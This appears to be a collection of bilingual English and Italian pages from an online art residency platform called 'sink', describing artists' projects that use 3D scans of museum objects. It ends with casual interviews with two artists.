La residenza di DITTO inizia con una determinata azione: la scansione 3D di una serie di soggetti coperti da teli, trovati lungo le strade. In un passaggio dal “reale” al “virtuale” il collettivo riflette sull’idea di forma, trasformazione e alterità legata all’oggetto coperto.
DITTO è un collettivo artistico nato nel 2016 con l’intento di creare un dialogo fluido tra diverse ricerche da ibridare in un’unica individualità. In una tensione generale verso l’accelerazione e il moltiplicarsi di immagini che si trasformano in materia sedimentata, il collettivo si pone nella condizione dell’archeologo operando in diversi contesti e spazi espositivi. DITTO riflette sull’impatto delle tecnologie digitali sottolineando in quali termini esse stanno rimodellando la nostra struttura sociale ed i nostri pattern culturali. DITTO è un’entità metamorfica che si insinua nello “stampo concavo del contemporaneo” e ne restituisce la forma.

Emir Šehanović
For his residency, Emir Šehanović is looking at how constructed, modified and transformed bodies are represented and mediated using the internet and networked technologies. Emir draws from Vivian Sobchack’s idea of the ‘digital morph’ as a culture’s common understanding of an ideal body that is constructed through constant improvement and its dissemination by advertising images, photo sharing platforms, film and fashion. His residency takes us through Western value systems and highlights how the internet facilitated the use of the desirable body for monetary value.
Emir has chosen statuettes from the African and Asian Collections of the Musée du Quai Branly in Paris, using their ritualistic and enshrining ceremonial circumstances as a starting point for his research into body decorations and modifications in our capitalistic culture. Entering the highway set out by gender roles, the two statuettes are both idols, one female one male, illustrating bodily ideals that were once worshipped. The wooden Gwan female sculpture is tied to ideals of physical beauty, character and action and in ceremony it is taken out of its shrine to be ritually washed, oiled and clothed, the Behu Lawolo male figure, made of stone, possibly shone as a symbol of masculinity, wealth and status. Throughout this month’s residency, Emir will be morphing these inanimate objects in the directions of the currents governed by our contemporary visual ideals.
Emir Šehanović ESH was born in 1981 in Tuzla, Bosnia & Herzegovina. In the late 90s he was already an active participant of the local street art scene under the pseudonym Aorta. His biography is filled with multi-faced engagements – from street art projects, over solo and collective exhibitions. Emir received international recognition for his mural projects, video, digital prints and multimedia. Pagan tradition, superstition and the occult are some of the constant themes present in his work. The final result may be a collage, print or spatial intervention, based in the digital domain but intruded by specific materials which have a deep cultural value for the author. The space receives a special treatment in his works, whether it is an intervention in public space or a classic format of a painting.
Per la sua residenza su sink, Emir Šehanović si interessa al modo in cui i corpi costruiti, modificati e trasformati sono rappresentati e mediati utilizzando internet. Emir prende spunto dall’idea di Vivian Sobchack del ‘digital morph’ come concezione comune ad una cultura di un corpo ideale che si costruisce attraverso il miglioramento continuo e la sua diffusione in immagini pubblicitarie, piattaforme di condivisione di immagini, film e moda. La sua residenza ci fa navigare i sistemi di valori occidentali ed evidenzia il modo in cui internet ha facilitato l’uso del corpo desiderabile per il valore monetario.
Emir ha scelto due statuette della collezione africana e asiatica del Musée du Quai Branly di Parigi, utilizzando le loro circostanze ritualistiche e cerimoniali come punto di partenza per la sua ricerca sulle decorazioni e modifiche del corpo nella nostra cultura capitalistica. Le due statuette sono entrambi idoli, uno femminile e uno maschile, che illustrano ideali corporei un tempo venerati. La scultura femminile in legno Gwan è legata a ideali di bellezza fisica e di carattere, usata in cerimonie, veniva estratta dal suo santuario per essere lavata ritualmente, oliata e vestita. La figura maschile Behu Lawolo, realizzata in pietra, brillava come simbolo di mascolinità, ricchezza e status. Durante la sua residenza, Emir trasformerà questi oggetti inanimati dandogli gli aspetti fisici dettati dai nostri ideali visivi contemporanei.
Emir Šehanović ESH è nato nel 1981 a Tuzla, Bosnia-Erzegovina. Alla fine degli anni ’90 partecipava già attivamente alla scena locale della street art con lo pseudonimo Aorta. La sua biografia è ricca di esperienze – da progetti di street art, a mostre personali e collettive. Emir ha ricevuto riconoscimenti internazionali per i suoi progetti murali, video, stampe digitali e multimediali. Tradizione pagana, superstizione e occulto sono alcuni dei temi presenti nel suo lavoro. Il risultato finale può essere un collage, una stampa o un intervento spaziale, basato sul dominio digitale ma intruso da materiali specifici che hanno un profondo valore culturale per l’autore. Lo spazio riceve un trattamento speciale nelle sue opere, sia che si tratti di un intervento nello spazio pubblico o di un formato classico di un quadro.

Rebecca Aston
During her November residency, Rebecca will explore Akan Gold Weights from the British Museum collection. Akan Gold Weights come from the region formerly known as the Gold Coast in Africa, or modern-day Ghana. They were used as part of a currency system to weigh gold dust to be traded for goods. The weights themselves hold many symbolic meanings that informed the act of trade. It was a flourishing system that the Portuguese first came into contact with, followed by other European nations such as the Dutch and the British. Later when the region was a British colony, the British banned this currency system and replaced it with their own. Many of these weights now remain in the British Museum collection, a few have been scanned and published online for download.
Focusing on time in the archive, or time as medium, Rebecca questions the unseen behind these 3D scans, which float out of context, perhaps more than ever before. In the context of museological acquisition and history telling, is the act of scanning an act of democratization? Who owns the gold weights now? Over the course of the month, drawing on media-archaeology and historical research, Rebecca will provide alternate ways to traverse through the data she unearths and collates. She will speculatively tie information into 3D form; looking at the dust that isn’t held in the archive. Questioning whether digitization can provide another picture, one that traces value, culpability, erasure and symbols. Towards the end of the residency you will be able to download a version of the artifact that attempts to capture this process.
Rebecca is a Zimbabwean artist currently based in London. She questions and decodes the meaning people embed in both physical and virtual spaces, objects and the environment. Looking through a post-colonial lens, she examines global flows of data, matter and people through history up until the present day and on into speculative futures. Temporality is central to her practice, both as medium, including capture technologies, computation and the moving image, as well as subject matter, in the form of history and memory. She is doing an MFA in Computational Art at Goldsmiths and has a BA in Fine Art from Yale.
Durante la sua residenza, Rebecca studierà i Akan Gold Weights della collezione del British Museum. I pesi d’oro Akan provengono dalla regione precedentemente conosciuta come la Costa d’Oro in Africa, l’odierno Ghana. Sono stati utilizzati come elemento di un sistema valutario per pesare la polvere d’oro da scambiare con le merci. I pesi stessi hanno molti significati simbolici che influenzarono l’atto del commercio. Era un sistema fiorente con cui i portoghesi entrarono in contatto per la prima volta, seguiti da altre nazioni europee come gli olandesi e gli inglesi. Più tardi, quando la regione era una colonia britannica, i britannici trapiantarono questo sistema monetario con il proprio. Molti di questi pesi ora rimangono nella collezione del British Museum, alcuni sono stati scansionati e pubblicati online per il download. Rebecca, concentrandosi sul tempo nell’archivio, o tempo come mezzo, si interroga sull’invisibile dietro queste scansioni 3D che galleggiano fuori contesto. Nel contesto dell’acquisizione museologica e del racconto storico, l’atto della scansione è un atto di democratizzazione? A chi appartengono i pesi d’oro oggi?
Nel corso del mese, attingendo all’archeologia dei media e alla ricerca storica, Rebecca fornirà modi alternativi per attraversare i dati che scopre e raccoglie. Legherà speculativamente le informazioni in forma 3D, guardando la polvere che non è contenuta nell’archivio, domandando se la digitalizzazione può fornire un’altra immagine, una che traccia valore, colpevolezza, cancellazione e simboli. Verso la fine della residenza potrete scaricare una versione dell’artefatto che tenta di catturare questo processo.
Rebecca è un’artista dello Zimbabwe, attualmente lavora e vive a Londra. Attraverso il suo lavoro, mette in discussione e decodifica il significato che le persone incorporano negli spazi fisici e virtuali, negli oggetti e nell’ambiente. Con una chiave postcoloniale, esamina i flussi globali di dati, materie e persone attraverso la storia fino ai nostri giorni e in un futuro speculativo. La temporalità è al centro della sua pratica, sia come mezzo, includendo le tecnologie di cattura, il calcolo e l’immagine in movimento, sia come soggetto, sotto forma di storia e memoria. Sta seguendo un MFA in Computational Art presso la Goldsmiths e ha conseguito un BA in Fine Art a Yale.

Johanna Flato
Johanna has a habit of inadvertently, but repeatedly, breaking the long-established rules of chess (we’re talking rules first established in India in the 6th century).
Amidst its many captured ‘hoards’ and artefacts, the British Museum prominently presents their own prized chess set as a pivotal ‘symbol of European civilisation.’ The Lewis Chessmen (AD 1150-1200) are a static collection of somber-faced royalty and faceless, formless pawns carved by Norsemen from whale teeth and walrus tusks and buried for centuries on a beach in the Western Isles. The British Museum acquired and glass-boxed the set after the trove was discovered in the 1800s. Now a digital shell of the set is available to download online.
For the October residency, Johanna invites visitors to participate in a new game on the sink platform, the rules and trajectories of which she’ll be making up and manipulating as the month advances. By playing along, visitors will join her in a non-linear inquiry into the revered mess of earnest concentration that chess typically calls for. Using the Lewis chess set as a starting point and the open-source platform Twine as an interactive storyboarding tool, Johanna and visiting players will encounter bad plays and bluffs; will explore parallels of ‘acquisition’ and violence in play, museology, and geopolitical war; and will see what happens when formulaic strategy and assumed rules and behaviours are corrupted. Beware broken hyperlinks.
At the end of the month and at the player’s completion of the game, an updated set of rules and a updated set of pieces will be be available for free download. 3D-print and play!
In her practice, Johanna creates research-based, iterative projects through which the tensions and thresholds between language, territory and technology are made visible. Her materials include maps, text, voice, and algorithms; variable outcomes span experimental micro-organizations, essays, digital video, installation, and, in this case, reconfigured chess sets.
Johanna ha l’abitudine di inavvertitamente, ma ripetutamente, infrangere le regole di lunga tradizione degli scacchi (stiamo parlando delle prime regole stabilite in India al VI secolo).
Tra i suoi numerosi ammassamenti e i suoi artefatti catturati, il British Museum presenta i suoi preziosi scacchi come “simbolo della civiltà europea”. I Lewis Chessmen (1150-1200 d.C.) sono una collezione statica di pedine senza volto o forma scolpite dai vichinghi a partire da denti di balena e zanne di tricheco e sepolte per secoli su una spiaggia delle Ebridi Esterne. Il British Museum acquistò e fece inscatolare il set dopo che il corredo fu scoperto nel 1800. Oggi come oggi, un guscio digitale del set è disponibile ad essere scaricato online su Sketchfab.
Per la residenza di ottobre, Johanna invita i visitatori a partecipare a un nuovo gioco su sink, le cui regole e traiettorie saranno inventate e manipolate man mano che il mese avanza. Giocando insieme, i visitatori si uniranno a lei in un’indagine non lineare del venerato pasticcio di sincera concentrazione richiesto di solito da una partita a scacchi. Utilizzando il set Lewis Chessmen come punto di partenza e la piattaforma open-source Twine come strumento di storyboarding interattivo, Johanna e i giocatori incontreranno cattivi giochi e bluff; esploreranno i paralleli tra processi di ‘acquisizione’ e violenza nel gioco, museologia e guerra geopolitica e vedranno cosa succede quando la strategia formulaica, le regole e i comportamenti assunti sono corrotti. Attenti ai hyperlinks rotti!
Alla fine del mese e al completamento del gioco, una versione nuova del gioco con regole e pedine aggiornate sara resa scaricabile. Stampate in 3D e giocate!
Nella sua pratica artistica Johanna crea progetti di ricerca interattivi attraverso i quali vengono rese visibili le tensioni e le soglie tra lingua, territorio e tecnologia. I suoi materiali includono mappe, testi, voce e algoritmi; gli esiti variabili comprendono microorganizzazioni sperimentali, saggi, video digitale, installazioni e, in questo caso, scacchiere riconfigurate.

Idle Institute
For their residency on sink, the Idle Institute have selected five 3D models of animal artefacts, each selected because of their parasitic qualities. For the Institute, each model will become a pretext for a poetic prank call. They are considered as zoomorphic symbols from five narrative worlds—entered via online chats, email threads and phone conversations.The Idle Institute made their selection in a ‘magpie’ manner, partially concealing the institutional and historical context. The objects were approached as triggers with narrative potential, becoming dingsymbols, totems in the fictional world of a story. A Boccaccian falcon becomes a curled rat from the Minneapolis Institute of Modern Art, a small, purely decorative sculpture once used to hang a pocket from a Kimono. Now, this curled relic of practical use will be resurrected as a digital pest and will seek to irritate multiple pest control sites…
The theme of a parasite is an excuse to naively initiate difficult questions of political urgency through awkward online and phone conversations. The 3d models of museum objects will be visually altered in response to the advice of business support helplines, pest control companies, sex chatrooms, zoos and restaurants to whom the prank calls will be directed. Working with objects of digital matter, the Idle Institute will attempt to ask questions about layers of representation, the translation of the corporeal to the symbolic and of the symbolic to the virtual.
The Idle Institute (established in 2017) is a storytelling lab: a collective of writers, filmmakers, sound-artists and engineers founded by Sonia Bernac, Eliot Allison and Bruno Klopott. Combining theories of the public sphere with quantum physics, they investigate the potentialities of the story – seen as virtual matter and a precise political tool. The Idle Institute’s projects build from narrative experiments: poetic traps in urban space, phone pranks, impersonation games and sci-fi installations. Currently developing a theory of the narratology of the public sphere, their research explores narrative entanglement, machine(s) of writing and technologies of storytelling.
They cheat occasionally, but only when it makes a good story…
Per la sua residenza, Idle Institute ha selezionato cinque modelli 3D di artefatti animali, scelti per la loro qualità parassitica. Per Idle Institute, ogni modello sarà un pretesto per mettere in atto dei poetici scherzi telefonici. Questi oggetti vengono considerati come dei simboli zoo-morfici di cinque mondi narrativi diversi, attraversati per mezzo di chiamate online, catene di email e conversazioni telefoniche.
Idle Institute ha fatto la sua selezione in modalità casuale, nascondendo in parte il contesto storico e istituzionale degli oggetti. Sono stati abbordati come stimoli con un potenziale di narrazione, diventando dingsymbols, totem nel mondo fittizio di una storia. Dal Minneapolis Institute of Modern Art, un Falco Boccaccio diventa un ratto arrotolato: una sculture piccola e puramente decorativa, una volta usata per appendere da una tasca di un Kimono. Ora, questa reliquia arrotolata di uso pratico sarà riesumata in un parassita digitale che cercherà di infettare un numero di siti di disinfestazione.
Il tema del parassita è una scusa per iniziare, in modo ingenuo, delle domande difficili di urgenza politica attraverso goffe chiamate online o telefoniche. I modelli 3d di oggetti museali saranno alterati visivamente rispondendo direttamente ai consigli dati da assistenze telefoniche, aziende di disinfestazione, chatroom di sesso, zoo e ristoranti ai quali questi scherzi saranno diretti.
Lavorando con oggetti di natura digitale, Idle Institute cercherà di fare domande sui livelli di rappresentazione, sulle traduzioni dallo stato corporeo allo stato simbolico e dallo stato simbolico a quello virtuale.
Idle Institute (costituito nel 2017) è un laboratorio per la narrazione di storie: un collettivo di scrittori, filmaker, sound-artist e ingegneri fondato da Sonia Bernac, Eliot Allison e Bruno Klopott. Mettendo assieme teorie della sfera pubblica con la fisica quantistica, investigano le potenzialità della storia – vista come materia virtuale e strumento politico. I progetti di Idle Institute si costruiscono da esperimenti narrativi: trappole poetiche in spazi urbani, scherzi telefonici, giochi di imitazione e installazioni sci-fi. Attualmente, sviluppando una teoria della narratologia della sfera pubblica, la loro ricerca esplora intrecci romanzeschi, macchine da scrivere e tecnologie dei racconti.

And as we wind on down this road, our shadow getting taller than our soul, we must undo our conscience’s knots and embrace what else was left at the perimeters of our thoughts. So if committing such crime must be my fate I’ll gladly reject our idea of nature so that I could have you look back at my face oh weird, twisted, fucked up creatures.
Let the nymphs of the forest tell you: *nature does not exist*.
In Giulio’s endless forest reside some adorable nymphs, elves and other enchanting creatures. When you find them you can download them and keep them forever. They might just haunt the deep crevices found in the bellies of your devices whilst in search of another corporeal forest. Until then, happy nymph-watching!

I was asked ‘What question would you ask yourself? I thought hard to find one, only to discover the initial question resonating, repeating itself like a mantra. What question would I ask myself? I came to think that THAT would have be the question. To ask yourself a question is to not know the answer, as, if you did know, to question is impossible.
Taking the residency time structure as a point of departure, I will make one work (that I shall call here, an answer) each day, that will in some capacity go on to inform the next. I want to find the parameters of answers, whereby the question is only formulated once the answer has presented itself.

sink – verb /ˈsiŋk / – Popularity: Bottom 50% of words
To go to the bottom. A trip to the buttocks. An excursion to the rear. Or maybe some would put it as is to become partly buried – (as in mud), (as in gunge), (as in plunging your hands in), (as in being in trouble for the mess on your new trousers). Similarly to become engulfed [not] enlarged, enflamed, enraged or engorged. But again it is to fall or drop to a lower place or a lower level or even lower than that if it’s possible. An utterance from another could be that it is to burn with lower intensity – a limp little match flickering in the rain, endeavouring regardless of futility (and disgusting all the same).
I found a newspaper a few weeks ago, printed on 12 September 2001. The combination of images, articles and adverts made for such a beautiful display of irony (a multitude of ironies) that I quickly became obsessed with it. For the month of October I will be digging – attempting to find whatever it is about this particular swamp that draws me in. It would be nice if you came along – let us Sink together.
thememoryofthepeasant.sink.sexy
Edoardo Manzoni
For the month of September, Edoardo Manzoni has chosen to share part of his research linked to Italian rural realities and material culture. He suggests a return to the primitive and the pastoral as an analogy of a study carried out by radical Italian architects and designers of the 70s, notably that of Superstudio: An investigation of peasant manual labour and most particularly of their capacity of being self sustainable as a way to define the true necessities of man today.
The anthropological experience of any planet, earth included, is inevitably mediated through a series of tools, an assemblage of devices which cultivate and transform an environment that would otherwise be uninhabitable. We look at the landscape to understand the reasons for our actions, the ones that permanently leave a mark of domestication on our planet. We also look at time itself to seek responses for the emotions left by dawn and the mysteries that great landscapes awake in ourselves. We look at seasons, the stars and planets. We look at distant space, free from any set paths that delineate new terms of creation and knowledge as the ones here on Earth.

This August, sink’s resident is Caterina Gobbi. She’ll be traveling south from Northern Italy to end up settling in Sicily. For her residency she will be trying to make sense of moving restlessly on the road whilst being an artist in residence. This feat will be accomplished following her grandma’s precious advice: being safe, promptly saying prayers and never forgetting the legacies of italianitude that flow through her veins.
instant-monuments.sink.sexy
Agostino Quaranta
Rome, where I grew up, is characterized by its strong bonds to classical culture. Latin language is the official language for the Vatican City State; the cultural heritage of the city is endlessly painted in political speeches and national television like a testament to this Italian idealized obsession with the past. The use of fancy and outdated expressions like ‘immeasurable heritage’, ‘eternal’, or any other reference to the Ancient Rome are all fragments that perpetuate a glorious ‘history’. This has pushed me to dig into past and present events, and create dialogues between them. I like to embrace the paradoxes of being a digital native that has grown up amidst the reminiscence of a conservative capital.
I’m currently interested in the values of antiquity and the production of replicas it generates. My residency on sink is dedicated to considering the contemporary life of historical monuments and the dichotomy between what should be real, original, and what should be exclusively understood as a copy. Can the future consolidate the value of the original monuments with that of the replicas? What will become of the originals and the value it is given to them? My starting point will be the Colosseum iconography since it is generally considered as one of the most recognizable site associated with Roman ancient past.
visitkipuka.sink.sexy
Riccardo Sossella
Visitkipuka is an open e-vite to visit oddly familiar places through a series of overlapping narratives, all set in the same fictional touristic destination.
We know every object, every shape, every island, every word has been colonized multiple times over history, and in the process of losing their ’authentic’ meanings and conquering new ones, these tokens have also accumulated power. This energy is the result of the deconstruction and subsequent requisition of structures over a defined space, whether cultural or geographical. I believe these metamorphoses have the capacity to crack open icons and symbols, unleashing their savage and rebellious nature.
Witness the formation of an archipelago as the day unfolds, knowing that misinterpretation is the only condition through which this journey can be fully experienced.

What do you do to shut down?
Ok so, I work out. That’s the only space I can be in, in which I’m not actually thinking about anything, other than the very immediate thing that I’m doing. So one of the things I started doing last year was barre, Physique 57…I’m a runner, I used to just run, so I run to shut down. But then I went through this like personal crisis and I started doing a lot of yoga but yoga makes me hyper flexible and you actually need a lot of strength training when you’re doing yoga so I started doing barre..that you’d call like the ballet dancer’s workout or something. So, it’s really for just sculpting and toning but it’s basically like isometric movements, you do dozens if not like hundreds of repetitions of the same thing using weights or your body weight. While you’re doing it you can’t think of anything else.
Is gyming quite a thing in Dubai?
It’s pretty important here, not just in terms of living a healthy lifestyle but generally other hyper neoliberal landscapes, everyone just works, then they go workout, so it’s a cycle that’s very much pushing the city.
The last time you felt nostalgic about something?
It’s interesting you ask this, I just had a very long conversation about nostalgia the other day with an artist who was visiting. I really hate nostalgia, like actively, it’s a tool for fascism so…I’ve had a problem with practices that might have a nostalgic element to them, I hate it in politics, I don’t think we should look back at anything. Uhmm, I try not to feel nostalgic myself..but it’s an exercise. So, am I nostalgic? No, I hate the past. Like life has ups and downs so for any moment that I can even think back to, there were so many other terrible things happening at the same time. It’s even related to people, like I’ll see you when I see you, it might be tomorrow it might be in 20 years, I don’t know, it’s hard also with your family to kind of let that go. I haven’t found much value in being homesick or missing people, just because it impacts how you can engage with what your immediate environment is that day, and I don’t wanna be paralysed and not engage with life. I think artists, especially in the region (gulf), need to focus more on ethical practices and like personal civic space and politics…because at least here nostalgia is about a politics of exclusion so immediately if I started getting nostalgic about what Dubai used to be, I’ve automatically just excluded you from something that I feel I’ve experienced, alone, MY sort of trauma, my kind of relationship with the city, that is not a generative conversation because you can’t participate in it if you’re not from here.
A dish you’d love to have but would never attempt cooking?
Brisket. It’s a very slow cooked meat, it’s like beef, I think it’s a southern thing, it cooks for like 15 hours haha. You can get a smoker for it. I know someone here who makes brisket, she has a smoker and she gets special firewood, you need to get a specific wood that will burn at a certain speed and have a certain fragrance that makes it super smoky. I love to eat it but there’s virtually no point in trying to make it.
Sunbathing or Spa?
Oh, Sunbathing. Yea, I mean..yea no sunbathing, vitamin D, we’re super deficient in that. A lot of people think vitamin D is related to exposure to the sun but it’s not, it’s also like where you are in relationship the the equator, altitude, and also genetic make up. There’s this really interesting book called Living Colour which is like an anthropological and scientific, you could almost say chronological history of how our skin developed melanin and biologically what it was for and what it represents, it also goes into the emergence of race as a category for identification. The entire book looks at the relationship between the body and vitamin D and how it needs it.
Do you have an artwork you know you will never sell?
I will never be able to sell a work that is very performative and nuanced, so like there’s a gym project where I had a setup of a gym, it’s large scale and it was produced in a part of the city where it was presented; here in Alserkal Avenue. This neighbourhood has a specific relationship to gym culture, you have like 50 different gyms within 10 minutes of where we are.
If someone wanted to buy the rights to this performance tomorrow would you sell it?
No, because it’s also temporal, it represents this place at that time so I wouldn’t sell that. I’m trying to think of something more intimate and sweet but I think I’m happy to sell all of my works except for the gym project.
What app do you use the most?
Oh I don’t use apps! I use whatsapp for communication but otherwise I’ll just make a call hahah! I also get overwhelmed by the prospect that I might have to download an app for work. So I’m always avoiding eye-contact whenever anyone in my office is talking about getting uber ‘use uber this week because it’s a tough week’ I don’t even look at them because I’m afraid they’ll ask me to arrange a car and I don’t have the app, and I don’t know how to get it and I don’t wanna get it! A lot of people here use tinder and things like that and there is a lot of pressure like ‘what tv show are you watching’ ‘what app are you using?’ ‘Are you using it to get food/ to get sex etc’
Your favourite seed?
Like to eat? Ok this is interesting…I really like sunflower seeds, i think they’re cool. Sperm is great also, always welcome…
The ultimate romantic song?
It’s kind of cheesy yea? This whole interview…It also makes me think because I never have these conversations. No one ever asks me…Uhm ok sure, can it be cheesy? Total Eclipse of the Heart, it’s a pretty hard core romantic song.
We don’t have to be romantic. What are you listening to now?
I’ve become really obsessed with lo-fi chill vibes compilations on youtube, they’re like their own thing now. You know how they had vaporwave, then they had simpsonwave, seinfeldwave..so there’s this whole thing to help people work, it always says something like ‘playlist good for work and study’. A lot of them have the Simpsons characters in loop, there’s one called ‘FEELINGS’. It’s always instrumental, there are no words. Now they’ve become such an entity that they’re being critiqued in people’s music.
A mode of transport you can’t live without?
Car. I think that if you ask that here in Dubai, you will always get this answer. I don’t know how people do without a car, I mean, we’re a family of 4 (my parents and my sister) and we have 3 cars.
Do you have a life hack for us?
Oh ok I have one, but it’s really pathetic and small: you know when you have a tea bag, I always have to loop round the mug handle for when I’m pouring the water, so that it doesn’t fall inside. When it goes inside and the water is too hot, you can’t fish it out with your fingers. By the way I only discovered this really late, I never did this, I would always hold the tea bag.
A question for us or something you’ve been reflecting on lately?
Oh, this is something I’ve been thinking a lot about and this could really open up a pandora’s box for your next interview:
Do you want to have children? And Why?
I want to, I really want to, I didn’t think about that for a really long time and I don’t know to what degree it’s social conditioning or something more biological, and I don’t know what studies are out there to tell us how men and women differ perhaps…I do know that now, I’m thinking practically how I can arrive at a point in my life where i can have children..I would have to find a partner first! Haha and then take it from there. Hopefully they’ll want kids too, otherwise you take it back to square one.

Cosa fai per staccare?
Allora, faccio sport. È l’unico spazio nel quale posso stare senza pensare ad altro a parte la cosa immediata che sto facendo. Una cosa che ho iniziato a fare l’anno scorso è la barre, Physique 57…Di solito corro, prima correvo soltanto, quindi correvo per rilassarmi. Ma poi ho avuto una crisi e ho iniziato a fare yoga, però fare yoga mi rende hyper flessibile e ho bisogno di allenamento di rinforzamento dei muscoli perciò ho iniziato a fare barre…che si potrebbe chiamare l’allenamento dei ballerini. È praticamente per scolpire e tonificare, sono movimenti isometrici con dozzine se non centinaia di ripetizioni della stessa cosa con dei pesi o il peso del proprio corpo. Quando fai quello non puoi pensare a nient’altro.
Andare in palestra è una cosa comune a Dubai?
Si è abbastanza importante qui, non solo per vivere una vita sana ma anche secondo modi di fare hyper neoliberali, tutti lavorano, e dopo vanno in palestra, è un ciclo che spinge la città.
L’ultima volta che ti sei sentita nostalgica?
È interessante che me lo chiedete, ho appena avuto una conversazione molto lunga a proposito della nostalgia con un’artista che è venuto a trovarmi. Odio la nostalgia, tipo attivamente, è uno strumento per il fascismo…Ho sempre avuto problemi con pratiche che hanno un elemento nostalgico, lo odio nella politica, penso che non dobbiamo guardare indietro per qualunque cosa. Mmmm, cerco di non essere nostalgica io stessa…ma è un esercizio. Quindi, sono nostalgica? No, odio il passato. La vita ha i su e giù, quindi per ogni momento al quale posso ripensare, ci sono sempre tante altre cose terribili che stavano succedendo contemporaneamente. Questo è anche legato alle persone, tipo ti vedrò quando ti vedrò, potrebbe essere domani o tra 20 anni. Non trovo tanto valore nell’avere nostalgia di casa o nella mancanza delle persone, solo perché ha un impatto fortissimo su quanto uno può essere coinvolto nel presente, non voglio essere paralizzata e non essere coinvolta nella mia vita stessa. Penso che gli artisti, soprattutto di questa regione del golfo, hanno bisogno di concentrarsi di più su lo spazio civico personale e la politica…perché per lo meno qui la nostalgia ha a che fare con le politiche di esclusione, se io iniziassi ad essere nostalgica di quello che era una volta Dubai, ti ho automaticamente escluso delle mia esperienza, del MIO trauma, della mia relazione con la città, non è uno spazio generativo perché non puoi partecipare alla conversazione se non sei di qua.
Un piatto che ti piace ma che non cucineresti mai?
Brisket. È una carne di manzo cotta molto piano, è una cosa del sud, si cuoce per tipo 15 ore. Puoi anche usare un affumicatore. Conosco qualcuno che cuoce il Brisket, ha un affumicatore e prende della legna specifica che brucia a una certa lentezza con fragranze specifiche che la rendono molto affumicata. Mi piace un sacco mangiarlo ma non c’è motivo nel cercare di farlo.
Prendere il sole o andare alla spa?
Oh, prendere il sole. Si, voglio dire…si no prendere il sole, vitamina D, ne siamo carenti. Tanti pensano che la vitamina D sia legata all’essere esposti al sole ma non lo è, ha a che fare anche con dove sei in relazione all’equatore, l’altitudine, e anche a come sei fatto geneticamente. C’è un libro molto interessante che si chiama Living Colour, che è uno studio scientifico antropologico, si potrebbe quasi dire uno studio cronologico storico di come la nostra pelle ha sviluppato la melatonina e di quello che rappresenta biologicamente, poi parla anche dell’emergenza della razza in quanto categoria di identificazione. Il libro intero tratta della relazione tra il corpo e la vitamina D e di come ne ha bisogno.
Hai un’opera d’arte che sai che non venderai mai?
Non potrò mai vendere un’opera molto performativa, in uno delle mie opere ho costruito una palestra, è a scala larga ed era prodotta nella parte della città dove è stata presentata, qui in Alserkal Avenue. Questo quartiere ha una relazione molto specifica alla cultura della palestra, hai tipo 50 palestre a 10 minuti da dove siamo.
Quale app usi più spesso?
Oh, io non uso le app! Io uso whatsapp per la comunicazione, ma per il resto faccio solo chiamate hahah! Sono anche sopraffatta dalla prospettiva di dover scaricare un’applicazione per lavoro. Così evito sempre il contatto visivo ogni volta che qualcuno nel mio ufficio sta parlando di usare uber ‘usa uber questa settimana perché è una settimana difficile’ non li guardo nemmeno perché ho paura che mi chiederanno di prenotare una macchina e non ho l’app, e non so come ottenerla e non la voglio! Un sacco di persone qui usano tinder e cose del genere e c’è molta pressione del tipo “che programma televisivo stai guardando”, “che app stai usando”, “La stai usando per mangiare, per fare sesso, ecc….”.
Il tuo seme preferito?
Da mangiare? Ok questo è interessante…mi piacciono i semi di girasole, penso siano cool. Seno lo sperma va bene, sempre benvenuto…
La canzone la più romantica in assoluto?
Un po’ smielata questa interview…E mi fa anche pensare perché non ho mai queste conversazioni. Nessuno mi chiede mai queste cose..Ma ok certo, può essere smielata? Total Eclipse of the Heart, come canzone è intensamente romantica.
Non dobbiamo essere romantici per forza. Cosa stai ascoltando adesso?
Sono diventata davvero ossessionata dalle compilation di lo-fi chill vibes che si trovano su youtube, sono proprio diventate una cosa in sé. Sai come lo sono state vaporwave, poi hanno avuto simpsonwave, seinfeldwave…dicono sempre qualcosa tipo ‘playlist good for work and study’. Tante hanno i personaggi dei Simpson in loop, ce n’è una che si chiama ’FEELINGS’. È sempre strumentale, non ci sono parole.
Un mezzo di trasporto con la quale non puoi vivere?
Macchina. Penso che qui a Dubai, troverete sempre questa risposta. Non so come faccia la gente senza una macchina, voglio dire, siamo una famiglia di 4 (i miei genitori e mia sorella) e abbiamo 3 macchine.
Hai un life hack per noi?
Ok allora ne ho uno ma è patetico e piccolo: sapete quando avete una bustina del te, io faccio sempre un anello per legarla alla maniglia della tazza quando ci metto sopra dell’acqua, così non ci casca dentro. Quando va dentro e l’acqua e troppo calda, devi ripescarla con le dita. Tra l’altro ho scoperto questa cosa molto tardi, non l’ho mai fatta prima, tenevo sempre la bustina con le mani.
Una domanda o qualcosa al quale stai riflettendo di recente?
Oh, c’è una cosa alla quale sto riflettendo tanto ultimamente e potrebbe realmente aprire un vaso di Pandora per la prossima interview: Vorresti avere dei figli? Perché?
Io vorrei dei figli. Per tanto tempo non ci ho pensato e non so fino a che grado sia un condizionamento sociale o qualcosa di più biologico, e non so quali siano gli studi fatti che ci potrebbero dire come siano diversi gli uomini dalle donne per queste cose…non lo so, ma ora sto pensando praticamente a come arrivare a un punto nella mia vita dove potrei avere dei figli… Prima dovrei trovare un partner! Haha e poi da li capire come muovermi, sperando che anche quest’altra persona abbia voglia di figli, se no si rinizia da capo.

If you could take a drug that kept you as fit as if you were doing sports, would you take it?
No, I like sports. I think it’s good for my brain and I think it’s like a good meditation to do sports, I don’t do sports to be fit but rather to feel good, I think it keeps me sane. I think it’s about getting into my body, getting out of my thinking process into into my physicality. Also, saying this, I don’t do that much sport, maybe a couple of times a week but I never go to the gym haha.
If you had to choose one sentimental object in your room to save from a fire (no laptops or electronics)?
Shit that’s really difficult, I’m really attached to things. I think maybe one plant? But one of my plants is dying so I’m really, sad about that. I’m also thinking, I’m on time pressure and in a panic and this is the only thing I can think of.
This one grew from a clipping I stole from an entrance lobby in a fancy building in London. It was doing well at first when suddenly an apple fell onto it and it sort of died. Only recently it started growing again, and since then I really like it.
What’s the first thing you do when you wake up?
I snooze and I go back to sleep! That’s the first, first thing. Once I get out of bed I take a shower and have breakfast. Or yea, I check my phone and it helps wake me up but it also stresses me out… like sometimes you see an email and you’re like ‘shit!’… but like I have difficulties getting out of bed maybe this is a good way to get me out of bed.
If you could only use one word for the rest of the day what would it be?
That’s really difficult. I think ‘hey’. You can use it in different intonations, like heeeey or hEi haha.
London or Amsterdam?
Oh that’s an evil one. I think for now it’s London but I don’t think it will be forever. Like right now for me London is really exciting but my boyfriend lives in Amsterdam… Friends of mine are moving back to Amsterdam, they moved away and they are moving back now and they’re enjoying it, I think I’m still really attached to Amsterdam.
The last thing you read that really stuck to you?
